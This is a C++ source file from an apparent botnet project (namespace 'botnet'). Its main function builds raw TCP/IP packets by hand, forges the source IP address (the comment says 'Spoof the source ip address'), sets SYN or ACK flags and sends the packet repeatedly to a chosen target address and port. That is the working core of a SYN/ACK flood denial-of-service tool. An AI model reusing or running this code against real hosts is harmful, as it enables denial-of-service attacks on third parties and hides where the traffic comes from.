#include "TCPFunctions.h"

#include <iostream>
#include <stdexcept>
#include <string.h>			//memset
#include <netinet/ip.h>		//Provides declarations for ip header

using namespace botnet;

void TCPFunctions::SendRawPacketData(const char dest_ip[INET_ADDRSTRLEN], uint16_t dest_port, bool syn, bool ack, size_t count) {
	//Create a raw socket
	int raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (raw_socket == -1) {
		throw std::runtime_error("socket failed " + std::string(strerror(errno)));
	}
	//Datagram to represent the packet
	char datagram[4096] , source_ip[32];
	//IP header
	struct iphdr *iph = (struct iphdr*) datagram;
	//TCP header
	struct tcphdr *tcph = (struct tcphdr*) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	 
	strcpy(source_ip , "192.168.1.2");
   
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dest_port);
	sin.sin_addr.s_addr = inet_addr(dest_ip);
	 
	memset (datagram, 0, 4096); /* zero out the buffer */
	 
	//Fill in the IP Header
	iph->ihl      = 5;
	iph->version  = 4;
	iph->tos      = 0;
	iph->tot_len  = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->id       = htons(54321);  //Id of this packet
	iph->frag_off = 0;
	iph->ttl      = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check    = 0;      //Set to 0 before calculating checksum
	iph->saddr    = inet_addr(source_ip);    //Spoof the source ip address
	iph->daddr    = sin.sin_addr.s_addr;
	 
	iph->check = TCPFunctions::csum((unsigned short*) datagram, iph->tot_len >> 1);
	 
	//TCP Header
	tcph->source  = htons(1234);
	tcph->dest    = htons(dest_port);
	tcph->seq     = 0;
	tcph->ack_seq = 0;
	tcph->doff    = 5;      /* first and only tcp segment */
	tcph->fin     = 0;
	tcph->syn     = syn ? 1 : 0;
	tcph->rst     = 0;
	tcph->psh     = 0;
	tcph->ack     = ack ? 1 : 0;
	tcph->urg     = 0;
	tcph->window  = htons (5840); /* maximum allowed window size */
	tcph->check   = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
	tcph->urg_ptr = 0;
	 
	//Now the IP checksum
	psh.source_address = inet_addr(source_ip);
	psh.dest_address   = sin.sin_addr.s_addr;
	psh.placeholder    = 0;
	psh.protocol       = IPPROTO_TCP;
	psh.tcp_length     = htons(20);
	 
	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
	 
	tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));
	 
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one        = 1;
	const int *val = &one;
	if (setsockopt (raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
		throw std::runtime_error("Error setting IP_HDRINCL: " + std::string(strerror(errno)));
	}
	 
	for (size_t times = 0; times < count; times++) {
		//Send the packet
		if (sendto (raw_socket,					/* our socket */
				    datagram,					/* the buffer containing headers and data */
					iph->tot_len,				/* total length of our datagram */
					0,							/* routing flags, normally always 0 */
					(struct sockaddr *) &sin,	/* socket addr, just like in */
					sizeof (sin)) < 0)			/* a normal send() */
		{
			throw std::runtime_error("Error sending packet");
		}
	}
}

	

unsigned short TCPFunctions::csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;
 
	sum=0;
	while(nbytes > 1) {
		sum    += *ptr++;
		nbytes -= 2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte) = *(u_char*)ptr;
		sum += oddbyte;
	}
 
	sum    = (sum>>16)+(sum & 0xffff);
	sum    = sum + (sum>>16);
	answer = (short)~sum;
	 
	return answer;
}